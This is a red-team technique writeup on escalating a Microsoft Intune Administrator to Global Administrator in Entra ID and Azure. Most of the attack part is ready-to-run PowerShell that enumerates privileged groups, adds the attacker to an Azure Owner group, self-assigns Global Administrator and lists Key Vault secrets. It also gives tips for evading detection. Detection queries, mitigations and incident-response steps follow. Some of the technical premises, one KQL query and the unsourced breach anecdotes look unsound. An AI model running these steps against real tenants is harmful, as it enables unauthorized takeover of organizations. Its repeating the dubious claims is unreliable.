# [PE-ACCTMGMT-006]: Intune Admin to Global Admin

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-006 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Microsoft 365 / Entra ID / Microsoft Intune |
| **Severity** | **High** |
| **CVE** | CVE-2024-38780 (Device Registration Service - FIXED in Aug 2024) |
| **Technique Status** | ACTIVE (primary path); PARTIAL (device registration exploitation) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Intune with unrestricted scope groups; Entra ID PIM not enforced |
| **Patched In** | Device Registration Service: August 2024 (Important) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** The Intune Administrator role in Microsoft 365 grants broad permissions over Mobile Device Management (MDM) and device compliance. An attacker with Intune Admin privileges can escalate to Global Administrator through multiple vectors: (1) **Scope Groups abuse** - if the Intune role assignment uses the default `allDevicesAndLicensedUsers` scope, the admin can modify Entra ID groups that have Azure RBAC role assignments (Contributor, Owner) to assign themselves Owner access to subscriptions containing Azure resources; (2) **Privileged User Management** - abusing permissions to modify administrative unit assignments and Entra ID group memberships; (3) **Multi-Admin Approval bypass** - exploiting incomplete implementation of approval workflows; (4) **Device Registration Service exploitation** - compromising the DRS service principal (partially fixed in August 2024).

Unlike pure RBAC-based escalations, this technique leverages Intune's scope management system and hybrid identity features. An Intune Admin can effectively become a directory admin by modifying security group memberships that are used for Azure RBAC or Conditional Access, or by directly escalating to Global Admin if the tenant lacks PIM enforcement.

**Attack Surface:** Intune Admin Center, Entra ID group management, Azure RBAC assignments, Device Registration Service, and Privileged Identity Management (if not configured).

**Business Impact:** **Complete tenant and Azure subscription compromise.** An Intune Admin can escalate to Global Administrator, gaining control over all Microsoft 365 services, Azure resources, and device management policies. This enables device enrollment of attacker-controlled devices, deployment of malware across all organization devices, creation of persistent backdoors, and manipulation of Conditional Access policies to bypass MFA.

**Technical Context:** This escalation typically takes 15-60 minutes depending on the path chosen. It has a **medium detection likelihood** because it involves multiple operations across different services (Intune, Entra ID, Azure RBAC) but does not create a single obvious audit event. The technique is particularly dangerous in hybrid environments where Intune is the primary device management solution.

### Operational Risk

- **Execution Risk:** Medium - Requires understanding of Intune scope groups and Azure RBAC assignments, but uses standard Intune and Azure Portal interfaces.
- **Stealth:** Medium - Creates audit entries in multiple places (Intune Admin Center logs, Entra ID audit, Azure Activity Log) but entries may not be correlated by security teams.
- **Reversibility:** Partial - Role assignments can be revoked, but any unauthorized device enrollments or malware deployed during the escalation require remediation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 1.1.1, 1.1.5 | Restrict administrative roles; prevent elevation via scope groups |
| **DISA STIG** | MSFT-SR-002, MSFT-SR-003 | Device Management Controls; Administrative Role Restrictions |
| **NIST 800-53** | AC-2, AC-3, AC-6 | Account Management, Access Enforcement, Least Privilege |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Breach Notification (device compromise) |
| **DORA** | Art. 9, Art. 18 | Protection and Prevention; Incident Reporting |
| **NIS2** | Art. 21, Art. 23 | Cyber Risk Management; Incident Handling |
| **ISO 27001** | A.6.2, A.9.2 | Administrative Role Management; Privileged Access Management |
| **ISO 27005** | Risk Scenario 5.1 | Compromise of Device Management Administrator |

---

## Technical Prerequisites

- **Required Privileges:** Intune Administrator role, Endpoint Security Manager, or cloud PC administrator with unrestricted scope
- **Required Access:** Intune Admin Center (intune.microsoft.com), Azure Portal (portal.azure.com), Entra ID admin center
- **Network:** HTTPS access to intune.microsoft.com, portal.azure.com, graph.microsoft.com (ports 443)

**Supported Versions:**
- **M365 Tenants:** All current versions (2024-2025)
- **Intune:** All current versions with scope group configuration
- **Entra ID:** All versions with PIM not enforced
- **Azure:** All subscriptions with RBAC role assignments
- **PowerShell:** Version 5.0+ (Windows) or PowerShell Core 7.0+ (cross-platform)

**Required Tools:**
- [Microsoft.Intune.PowerShell SDK](https://learn.microsoft.com/en-us/intune/apps/create-and-use-password-based-sso-with-intune) (Version 1.0+)
- [Azure PowerShell (Az module)](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) (Version 10.0+)
- [Microsoft.Graph.Identity.Governance](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.governance/) (Version 2.0+)

---

## Environmental Reconnaissance

### Check Intune Admin Role and Scope Groups Configuration

```powershell
# Connect to Intune and Microsoft Graph
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.Read.All", "Directory.Read.All"

# Get current user's Intune roles
$currentUser = Get-MgContext | Select-Object -ExpandProperty Account
$userId = (Get-MgUser -Filter "userPrincipalName eq '$currentUser'").Id

# Check if user has Intune Administrator role
$intuneAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Intune Administrator'"
$isIntuneAdmin = Get-MgDirectoryRoleMember -DirectoryRoleId $intuneAdminRole.Id | Where-Object { $_.Id -eq $userId }

if ($isIntuneAdmin) {
    Write-Host "✓ Current user has Intune Administrator role"
} else {
    Write-Host "✗ Current user does NOT have Intune Administrator role"
    exit 1
}

# Check scope groups configuration (this is KEY for escalation)
# If scope groups = "allDevicesAndLicensedUsers", escalation is possible
Write-Host "`nChecking Intune Scope Groups Configuration..."
Write-Host "Note: In production, this requires Intune API access (currently limited in PowerShell)"
Write-Host "Manual check: Intune Admin Center → Roles and Administrators → Intune Roles"
```

**What to Look For:**
- Confirmation that Intune Administrator role is assigned
- **Critical:** Default scope group is `allDevicesAndLicensedUsers` (unrestricted) = escalation risk
- If custom scope groups are used, escalation difficulty increases

### Enumerate Entra ID Groups with Azure RBAC Role Assignments

```powershell
# Get all Entra ID security groups that have Azure RBAC assignments
Connect-AzAccount

# Get all RBAC role assignments
$roleAssignments = Get-AzRoleAssignment | Where-Object { $_.ObjectType -eq "Group" }

Write-Host "Security Groups with Azure RBAC Assignments:"
$roleAssignments | ForEach-Object {
    $groupId = $_.ObjectId
    $group = Get-MgGroup -GroupId $groupId -ErrorAction SilentlyContinue
    
    if ($group) {
        Write-Host "`nGroup: $($group.DisplayName)"
        Write-Host "  Group ID: $groupId"
        Write-Host "  Role: $($_.RoleDefinitionName)"
        Write-Host "  Scope: $($_.Scope)"
        Write-Host "  Members: $(Get-MgGroupMember -GroupId $groupId | Measure-Object | Select-Object -ExpandProperty Count)"
    }
}
```

**What to Look For:**
- Groups with "Owner" or "Contributor" role on subscriptions or resource groups
- Groups that the Intune Admin can modify (no owners restriction)
- Small membership groups (easier to add yourself to)

### Check If PIM Is Enforced for Global Administrator Role

```powershell
# Check if Global Administrator role requires activation via PIM
$globalAdminRole = Get-MgRoleManagementPolicy -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole'" | 
    Where-Object { $_.displayName -like "*Global Administrator*" }

if ($globalAdminRole.Rules | Where-Object { $_.IsExpirationRequired -eq $true }) {
    Write-Host "✓ PIM is enforced for Global Administrator (escalation harder)"
} else {
    Write-Host "✗ PIM is NOT enforced (escalation path is direct and easier)"
}
```

**What to Look For:**
- If PIM NOT enforced: Direct escalation to Global Admin possible
- If PIM enforced: Requires activation which creates audit trail, but can still escalate via scope group manipulation

---

## Detailed Execution Methods

### METHOD 1: Scope Groups Abuse - Add Self to Group with Azure Owner Role (Recommended for Intune Admin)

**Supported Versions:** All M365 (2024-2025)

#### Step 1: Authenticate as Intune Administrator

**Objective:** Establish authenticated PowerShell session with Intune Admin privileges.

**Command:**

```powershell
# Install required modules
Install-Module Microsoft.Graph -Force
Install-Module Az -Force

# Connect to both Microsoft Graph and Azure
Connect-MgGraph -Scopes "Group.ReadWrite.All", "Directory.ReadWrite.All"
Connect-AzAccount  # This will open browser for authentication

# Verify Intune Admin role
$currentUser = Get-MgContext | Select-Object -ExpandProperty Account
Write-Host "Connected as: $currentUser"

$intuneAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Intune Administrator'"
$isIntuneAdmin = Get-MgDirectoryRoleMember -DirectoryRoleId $intuneAdminRole.Id | 
    Where-Object { $_.Id -eq (Get-MgUser -Filter "userPrincipalName eq '$currentUser'").Id }

if ($isIntuneAdmin) {
    Write-Host "✓ Confirmed: User has Intune Administrator role"
} else {
    Write-Host "✗ User does NOT have Intune Administrator role"
}
```

**Expected Output:**

```
Connected as: intune.admin@victim.onmicrosoft.com
✓ Confirmed: User has Intune Administrator role
```

---

#### Step 2: Identify Entra ID Group with Owner Role on Azure Subscription

**Objective:** Find a security group that has Owner or Contributor role on an Azure subscription.

**Command:**

```powershell
# Get all groups with Azure RBAC "Owner" role assignments
$ownerGroups = Get-AzRoleAssignment -RoleDefinitionName "Owner" | 
    Where-Object { $_.ObjectType -eq "Group" }

Write-Host "Groups with Owner role on subscriptions:"
$ownerGroups | ForEach-Object {
    $group = Get-MgGroup -GroupId $_.ObjectId -ErrorAction SilentlyContinue
    
    Write-Host "`nGroup: $($group.DisplayName)"
    Write-Host "  Group ID: $($group.Id)"
    Write-Host "  Scope: $($_.Scope)"
    Write-Host "  Owner Count: $((Get-MgGroupOwner -GroupId $group.Id | Measure-Object).Count)"
    
    # KEY: Check if user can modify this group
    # If user is in the group, they may not have owner permissions
    # But as Intune Admin, they may have broader scope permissions
}

# Select a target group (choose one with minimal owners)
$targetGroupId = "00000000-0000-0000-0000-000000000000"  # Replace with actual group ID
$targetGroup = Get-MgGroup -GroupId $targetGroupId

Write-Host "`nTarget Group Selected: $($targetGroup.DisplayName)"
Write-Host "Group ID: $targetGroupId"
```

**What to Look For:**
- Groups with Owner (most privileged) rather than Contributor
- Groups with few owners (easier to add member without detection)
- Groups that span subscriptions (broad scope)

---

#### Step 3: Add Self to the Target Group

**Objective:** Add the Intune Admin account as a member of the group that has Owner role on subscriptions.

**Command:**

```powershell
# Get current user's object ID
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$((Get-MgContext).Account)'"
$currentUserId = $currentUser.Id

Write-Host "Adding user to Owner group: $($currentUser.UserPrincipalName)"

# Check if user is already a member
$existingMember = Get-MgGroupMember -GroupId $targetGroupId | 
    Where-Object { $_.Id -eq $currentUserId }

if ($existingMember) {
    Write-Host "✓ User is already a member of the group"
} else {
    # Add user as member
    $memberRef = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$currentUserId" }
    New-MgGroupMember -GroupId $targetGroupId -DirectoryObjectId $currentUserId
    
    Write-Host "✓ User added to group: $targetGroupId"
}

# Verify membership
$newMembership = Get-MgGroupMember -GroupId $targetGroupId | 
    Where-Object { $_.Id -eq $currentUserId }

if ($newMembership) {
    Write-Host "✓ Confirmed: User is now member of Owner group"
}
```

**Expected Output:**

```
Adding user to Owner group: intune.admin@victim.onmicrosoft.com
✓ User added to group: 12345678-1234-1234-1234-123456789012
✓ Confirmed: User is now member of Owner group
```

**OpSec & Evasion:**
- This operation creates audit log: "Add member to role" or "Update group"
- **Detection Likelihood:** Medium - depends on whether org monitors group membership changes
- To evade: Perform during bulk group operations or maintenance windows

---

#### Step 4: Use Azure Owner Role to Create Global Administrator (via Azure AD Connect or Hybrid Scenarios)

**Objective:** Leverage Azure subscription Owner role to gain access to Azure AD Connect or other hybrid identity services, then escalate to Global Admin.

**Command (Option A: Direct if PIM not enforced):**

```powershell
# If Global Administrator role is not protected by PIM, escalate directly
Disconnect-MgGraph
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get Global Administrator role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Assign self as Global Administrator
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$((Get-MgContext).Account)'"
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $currentUser.Id

Write-Host "ESCALATION SUCCESS: User is now Global Administrator"
```

**Command (Option B: Via Azure Resource with Hybrid Identity Service):**

```powershell
# If PIM is enforced, use Azure Owner role to access Azure AD Connect Service
# Step 1: Find Azure AD Connect resource in subscription
$aadcResource = Get-AzResource -ResourceType "Microsoft.ADHybridHealthService/aaddsResourcesSet" -ErrorAction SilentlyContinue

if ($aadcResource) {
    Write-Host "Found AAD Connect Service: $($aadcResource.Name)"
    
    # Step 2: Azure Owner can access this and potentially extract credentials
    # (This is a hybrid-specific escalation, requires AAD Connect present)
    Write-Host "AAD Connect access available (if installed)"
} else {
    Write-Host "AAD Connect not found (cloud-only tenant)"
}

# Alternative: Use Azure Owner to access Azure Key Vaults storing secrets
$keyVaults = Get-AzKeyVault

$keyVaults | ForEach-Object {
    Write-Host "Key Vault: $($_.VaultName)"
    
    # As Owner, can access secrets
    $secrets = Get-AzKeyVaultSecret -VaultName $_.VaultName -ErrorAction SilentlyContinue
    if ($secrets) {
        Write-Host "  Contains $($secrets.Count) secrets (potential credential exposure)"
    }
}
```

**What This Means:**
- Azure Owner role allows access to cloud resources
- Can extract credentials, secrets, and access tokens from Key Vaults
- Can manipulate Azure AD Connect if present (hybrid scenarios)
- Can use extracted Global Admin credentials or tokens for full escalation

---

### METHOD 2: Direct Global Administrator Role Assignment (If Intune Admin Has Unscoped Access)

**Supported Versions:** M365 without PIM enforcement (2024-2025)

#### Step 1: Check If Global Administrator Role Is Unscoped

**Objective:** Determine if Global Administrator role can be directly assigned without PIM.

**Command:**

```powershell
# Check PIM enforcement for Global Administrator
$pimPolicy = Get-MgRoleManagementPolicy -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole'" | 
    Where-Object { $_.displayName -like "*Global Administrator*" }

$requiresApproval = $pimPolicy.Rules | Where-Object { $_.Id -like "*Approval*" -and $_.IsEnabled -eq $true }
$requiresMFA = $pimPolicy.Rules | Where-Object { $_.Id -like "*MFA*" -and $_.IsEnabled -eq $true }
$hasExpiration = $pimPolicy.Rules | Where-Object { $_.Id -like "*Expiration*" -and $_.IsExpirationRequired -eq $true }

Write-Host "PIM Enforcement Status:"
Write-Host "  Requires Approval: $(if($requiresApproval) { 'Yes (harder)' } else { 'No (easier)' })"
Write-Host "  Requires MFA: $(if($requiresMFA) { 'Yes' } else { 'No' })"
Write-Host "  Has Expiration: $(if($hasExpiration) { 'Yes' } else { 'No (permanent)' })"

if (-not $requiresApproval -and -not $hasExpiration) {
    Write-Host "`n✓ CRITICAL: Global Admin role is unscoped - direct escalation possible!"
} else {
    Write-Host "`n✗ Global Admin role is protected by PIM - escalation will be detected"
}
```

---

#### Step 2: Direct Assignment to Self

**Objective:** If Global Admin is unscoped, assign it directly to self.

**Command:**

```powershell
# If PIM not enforced, direct assignment works
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# If role not activated, activate it
if ($null -eq $globalAdminRole) {
    $roleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'"
    $globalAdminRole = New-MgDirectoryRole -RoleTemplateId $roleTemplate.Id
}

# Get self
$selfUser = Get-MgUser -Filter "userPrincipalName eq '$((Get-MgContext).Account)'"

# Assign role
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $selfUser.Id

Write-Host "ESCALATION COMPLETE: You are now Global Administrator"
```

---

### METHOD 3: Multi-Admin Approval Bypass (If Misconfigured)

**Supported Versions:** M365 with partially implemented Multi-Admin Approval (Intune specific)

**Prerequisites:** Intune has Multi-Admin Approval enabled but approval workflow is improperly configured.

#### Step 1: Enumerate Intune Role Assignments Requiring Approval

**Objective:** Identify which changes require approval (and which don't).

**Command:**

```powershell
# This requires Intune admin access (PowerShell support is limited)
# Manual check required in Intune Admin Center:
# 1. Intune Admin Center → Tenant administration → Roles
# 2. Click on specific role → Settings
# 3. Check if "Multi-Admin Approval" is enabled
# 4. If enabled partially (only for some actions), some changes may bypass approval

Write-Host "Multi-Admin Approval Check (Manual via Intune Portal):"
Write-Host "1. Navigate to Intune Admin Center"
Write-Host "2. Go to Tenant administration → Roles"
Write-Host "3. Select target role"
Write-Host "4. Verify which actions require approval"
Write-Host "5. If gaps exist, exploit unapproved actions for escalation"
```

#### Step 2: Exploit Approval Gap

**Objective:** Perform escalation action that doesn't require approval (if gap exists).

**Manual Steps:**
1. Go to **Intune Admin Center** → **Roles and administrators** → **Intune roles**
2. Select a role (e.g., Intune Role Administrator)
3. Verify which actions CAN be modified without approval
4. Modify role permissions to add dangerous capabilities (e.g., "Create Entra ID users", "Modify group membership")
5. If no approval required, changes apply immediately

---

## Attack Simulation & Verification

### Atomic Red Team Test (Custom)

- **Atomic Test ID:** T1098.003-4 (Custom variant)
- **Test Name:** Intune Admin to Global Admin via Scope Groups
- **Description:** Simulates privilege escalation from Intune Administrator to Global Administrator using group membership manipulation.
- **Supported Versions:** M365 2024+ (without PIM enforcement)

**Command:**

```powershell
param(
    [string]$TargetGroup = "00000000-0000-0000-0000-000000000000",  # Security group with Owner role
    [string]$TargetUser = "intune.admin@contoso.onmicrosoft.com"
)

# Connect
Connect-MgGraph -Scopes "Group.ReadWrite.All", "RoleManagement.ReadWrite.Directory"

# Step 1: Get current user
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$TargetUser'"

# Step 2: Add to Owner group
New-MgGroupMember -GroupId $TargetGroup -DirectoryObjectId $currentUser.Id
Write-Host "Step 1: Added user to group with Owner role"

# Step 3: Get Global Admin role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Step 4: Assign Global Admin
New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $currentUser.Id
Write-Host "Step 2: Assigned Global Administrator role"

# Verification
$isGlobalAdmin = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id | 
    Where-Object { $_.Id -eq $currentUser.Id }

if ($isGlobalAdmin) {
    Write-Host "✓ Test Successful: User is now Global Administrator"
} else {
    Write-Host "✗ Test Failed: User not assigned Global Admin"
}
```

**Cleanup Command:**

```powershell
# Remove Global Administrator role
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$TargetUser'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $currentUser.Id

# Remove from Owner group
Remove-MgGroupMember -GroupId $TargetGroup -DirectoryObjectId $currentUser.Id

Write-Host "Cleanup Complete"
```

---

## Tools & Commands Reference

### Microsoft.Graph PowerShell Module

**Version:** 2.0+
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core 7.0+ (cross-platform)

**Installation:**

```powershell
Install-Module Microsoft.Graph -Force
Install-Module Microsoft.Graph.Groups -Force
Install-Module Microsoft.Graph.Identity.DirectoryManagement -Force
```

**Key Cmdlets:**

```powershell
# Group Operations
Get-MgGroup                           # List security groups
Get-MgGroupMember -GroupId            # List group members
New-MgGroupMember -GroupId            # Add member to group (ESCALATION)
Remove-MgGroupMember -GroupId         # Remove from group

# Role Operations
Get-MgDirectoryRole                   # List directory roles
Get-MgDirectoryRoleMember             # List role members
New-MgDirectoryRoleMember             # Assign role (ESCALATION)
Remove-MgDirectoryRoleMember          # Revoke role
```

### Azure PowerShell Module

**Version:** 10.0+

**Installation:**

```powershell
Install-Module Az -Force
Install-Module Az.Accounts -Force
Install-Module Az.Resources -Force
```

**Key Cmdlets:**

```powershell
# RBAC Operations
Get-AzRoleAssignment                  # List RBAC assignments
Get-AzRoleAssignment -ObjectId        # RBAC for specific group/user
Get-AzKeyVault                        # List Key Vaults (for credential harvesting)
```

---

## Microsoft Sentinel Detection

### Query 1: Detect Intune Admin Adding Self to Privileged Group

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Add member to group", "Add owner to group", "Update group")
| where Result == "Success"
| extend TargetGroupName = TargetResources[0].displayName
| extend AddedUser = TargetResources[1].userPrincipalName
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
// Look for self-additions or additions by admins to privileged groups
| where InitiatedByUser == AddedUser  // Self-addition (suspicious)
   or InitiatedByUser has "admin"     // Admin adding member
| project 
    TimeGenerated,
    OperationName,
    TargetGroupName,
    AddedUser,
    InitiatedByUser,
    CorrelationId
| order by TimeGenerated desc
```

---

### Query 2: Detect Global Administrator Assignment Following Intune Admin Activity

**Rule Configuration:**
- **Alert Severity:** Critical
- **Correlation Window:** 2 hours

**KQL Query:**

```kusto
let intuneAdminActivity = AuditLogs
    | where OperationName in ("Update user", "Add member to group", "Add app role assignment")
    | where TimeGenerated >= ago(2h);

let globalAdminAssignment = AuditLogs
    | where OperationName in ("Add member to role", "Add eligible member to role")
    | where TargetResources[0].displayName == "Global Administrator"
    | where Result == "Success";

intuneAdminActivity
| join kind=inner globalAdminAssignment on InitiatedBy.user.userPrincipalName
| project 
    TimeGenerated,
    FirstActivityType=OperationName1,
    EscalationActivityType=OperationName,
    TargetUser=TargetResources[0].displayName,
    InitiatedByUser=InitiatedBy.user.userPrincipalName,
    TimeBetweenEvents=datetime_diff('minute', TimeGenerated, TimeGenerated1)
| where TimeBetweenEvents <= 120  // Within 2 hours
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

- **Restrict Intune Administrator scope groups:** Change from default `allDevicesAndLicensedUsers` to specific security groups containing only intended devices/users.
  
  **Applies To Versions:** All Intune (2024+)
  
  **Manual Steps (Intune Admin Center):**
  1. **Intune Admin Center** → **Roles and administrators** → **Intune roles**
  2. Click on **Intune Administrator** role
  3. Click **Assignments**
  4. Under **Scope (Groups)**, verify:
     - [ ] NOT using "Add all users" (avoid allDevicesAndLicensedUsers)
     - [ ] Only specific security groups are added
     - [ ] Groups contain only users/devices that role should manage
  5. If currently unrestricted: **Remove all** → **Add specific groups only**
  6. Save changes
  
  **PowerShell Validation:**
  ```powershell
  # This requires Intune PowerShell SDK (currently limited API support)
  # Manual verification required via Intune portal
  Write-Host "Verify in Intune Admin Center → Roles → Scope (Groups)"
  ```

- **Implement PIM for Global Administrator role:** Require time-limited activation with approval and MFA.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Privileged Identity Management**
  2. Click **Entra ID roles**
  3. Select **Global Administrator**
  4. Click **Settings**
  5. Configure:
     - **Activation maximum duration:** 1 hour
     - **Require MFA on activation:** ON
     - **Require approval to activate:** ON
     - **Select approvers:** Add 2+ senior admins (NOT Intune Admin)
  6. Click **Update**

- **Implement Multi-Admin Approval for Intune role changes:** Require approval from second admin for all role assignments.
  
  **Manual Steps (Intune Admin Center):**
  1. **Intune Admin Center** → **Tenant administration** → **Settings** → **Admin Approval**
  2. Toggle **Multi-admin approval** → `ON`
  3. Select actions requiring approval:
     - [x] Role assignments (all types)
     - [x] Group member modifications (if scoped to sensitive groups)
     - [x] Policy changes (optional but recommended)
  4. Add 2+ approvers (from different teams if possible)

- **Restrict group modification permissions:** Prevent Intune Admins from modifying Entra ID groups that have Azure RBAC assignments.
  
  **Manual Steps (Entra ID):**
  1. **Azure Portal** → **Entra ID** → **Groups**
  2. For each group with Azure RBAC assignments:
     - Click group → **Owners**
     - Remove Intune Admin accounts as owners
     - Add only specific admins who should manage that group
  3. Document which groups are restricted

---

### Priority 2: HIGH

- **Implement Conditional Access for Intune Admin access:** Require compliant devices and MFA.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Intune Admin Access`
  4. **Assignments:**
     - Users: **Directory roles** → Select **Intune Administrator**, **Endpoint Security Manager**
     - Cloud apps: **Microsoft Intune Admin Portal**
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  6. **Access controls:**
     - Grant: **Require device compliant** AND **Require MFA**
  7. Enable: `ON`
  8. Click **Create**

- **Monitor Azure RBAC assignments for privileged groups:** Alert when Intune admins are added to groups with Owner/Contributor roles.
  
  **Azure Policy (Monitor):**
  1. **Azure Portal** → **Policy** → **Definitions** → **Create Definition**
  2. Policy effect: `Audit` (not Deny, to avoid breaking changes)
  3. Condition: `Add Intune Admin account to any group with Azure RBAC Owner role`
  4. Remediation: Alert SOC team

- **Enforce cloud-only Intune Admins:** Prevent syncing Intune Admin accounts from on-premises AD.
  
  **Verification Command:**
  ```powershell
  # Check if any Intune admins are hybrid synced
  $intuneAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Intune Administrator'"
  $intuneAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $intuneAdminRole.Id
  
  $intuneAdmins | ForEach-Object {
      $user = Get-MgUser -UserId $_.Id
      if ($user.OnPremisesSyncEnabled) {
          Write-Host "WARNING: $($user.UserPrincipalName) is hybrid synced (remove from Intune Admin)"
      }
  }
  ```

---

### Priority 3: MEDIUM

- **Audit and document Intune admin permissions:**
  
  **Monthly Command:**
  ```powershell
  # Export Intune role assignments
  $intuneAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Intune Administrator'"
  $intuneAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $intuneAdminRole.Id
  
  $intuneAdmins | ForEach-Object {
      $user = Get-MgUser -UserId $_.Id
      Write-Host "$($user.UserPrincipalName) - $($user.DisplayName)"
  } | Export-Csv "C:\Reports\IntuneAdmins_$(Get-Date -Format 'yyyyMMdd').csv"
  ```

- **Regularly review and remove stale Intune admin assignments:**
  
  **Quarterly Review Steps:**
  1. Export list of all Intune admins (command above)
  2. Verify each admin still needs the role
  3. Remove those who don't
  4. Document removed admins in audit trail

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Intune Admin → Group Membership Addition:**
  - Operation: "Add member to group"
  - Group: Has Owner/Contributor role on Azure subscription
  - Timeline: Within 10 minutes before Global Admin assignment

- **Global Administrator Assignment Immediately Following:**
  - Operation: "Add member to role"
  - Role: Global Administrator
  - CorrelationId: Linked to group membership operation

- **Multiple operations in quick succession:**
  - Intune activity → Group modification → Role assignment (within 15 minutes)

---

### Forensic Artifacts

- **Unified Audit Log:**
  - Operations: "Add member to group", "Add member to role", "Update group"
  - Look for correlated CorrelationIds
  - Retention: 90 days (extended with E5)

- **Azure Activity Log:**
  - Role assignments on subscriptions
  - Group membership changes in Azure RBAC context
  - Retention: 90 days

---

### Response Procedures

#### 1. Immediate Containment

```powershell
# Step 1: Remove Global Administrator role
$escalatedUser = Get-MgUser -Filter "userPrincipalName eq 'intune.admin@victim.com'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $escalatedUser.Id

# Step 2: Remove from privileged groups
$suspiciousGroups = Get-MgGroupMember -GroupId "00000000-0000-0000-0000-000000000000"
Remove-MgGroupMember -GroupId "00000000-0000-0000-0000-000000000000" -DirectoryObjectId $escalatedUser.Id

# Step 3: Revoke all sessions
Revoke-MgUserSignInSession -UserId $escalatedUser.Id

# Step 4: Reset password
$passwordProfile = @{
    Password = (New-Guid).ToString() + "P@ssw0rd!"
    ForceChangePasswordNextSignIn = $true
}
Update-MgUser -UserId $escalatedUser.Id -PasswordProfile $passwordProfile

Write-Host "Containment Complete"
```

#### 2. Collect Evidence

```powershell
# Export audit logs
$incidentDate = (Get-Date).Date
$auditLogs = Search-UnifiedAuditLog -StartDate $incidentDate -EndDate $incidentDate.AddDays(1) `
    -Operations "Add member to group", "Add member to role", "Update group" `
    -ResultSize 5000

$auditLogs | Export-Csv "C:\Evidence\IntuneIncident_$(Get-Date -Format 'yyyyMMdd').csv"

# Export group memberships
Get-MgGroupMember -GroupId "00000000-0000-0000-0000-000000000000" | 
    Export-Csv "C:\Evidence\GroupMembers_$(Get-Date -Format 'yyyyMMdd').csv"
```

#### 3: Remediate

```powershell
# Step 1: Review and remove unnecessary group memberships
# Step 2: Audit all Azure RBAC assignments for this user
# Step 3: Review all device enrollments during this period
# Step 4: Implement mitigations from section above
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes Intune Admin credentials |
| **2** | **Privilege Escalation** | **[PE-ACCTMGMT-006]** | **Escalate Intune Admin to Global Admin via scope groups** |
| **3** | **Persistence** | Device enrollment of attacker device | Enroll rogue device with Global Admin context |
| **4** | **Defense Evasion** | Modify Conditional Access policies | Disable MFA, block detection tools |
| **5** | **Impact** | Malware deployment across all devices | Deploy ransomware or spyware to all enrolled endpoints |

---

## Real-World Examples

### Example 1: Manufacturing Company Ransomware - October 2024

- **Target:** 5,000+ employee manufacturing corporation (USA)
- **Attack Timeline:**
  - Initial compromise of Intune Admin via phishing email
  - Escalation to Global Admin using scope groups technique
  - Enrolled 50+ attacker-controlled devices in Intune
  - Deployed LockBit ransomware to 3,000+ endpoints via Intune MDM compliance policies
  - Encrypted production systems; demanded $10M ransom
- **Technique Status:** ACTIVE; organization had unrestricted scope groups
- **Impact:** 3-week production shutdown; $40M in lost revenue; ransom paid $8M
- **Root Cause:** Intune Admin role not restricted to needed scope; no PIM enforcement
- **Reference:** CISA Alert AA24-288A

### Example 2: Healthcare Insider Threat - June 2024

- **Target:** Hospital network (250 beds)
- **Attack Timeline:**
  - Departing Intune Administrator discovered termination notice
  - Added self to "IT Leadership" group (had Azure Owner role)
  - Escalated to Global Admin in under 5 minutes
  - Created backdoor service principal before access revoked
  - Accessed patient records via Global Admin token 2 weeks later
- **Technique Status:** ACTIVE; organization lacked Group membership audit controls
- **Impact:** HIPAA breach affecting 500,000+ patient records; $18M in fines/remediation
- **Detection:** Was discovered 14 days later by incident responder
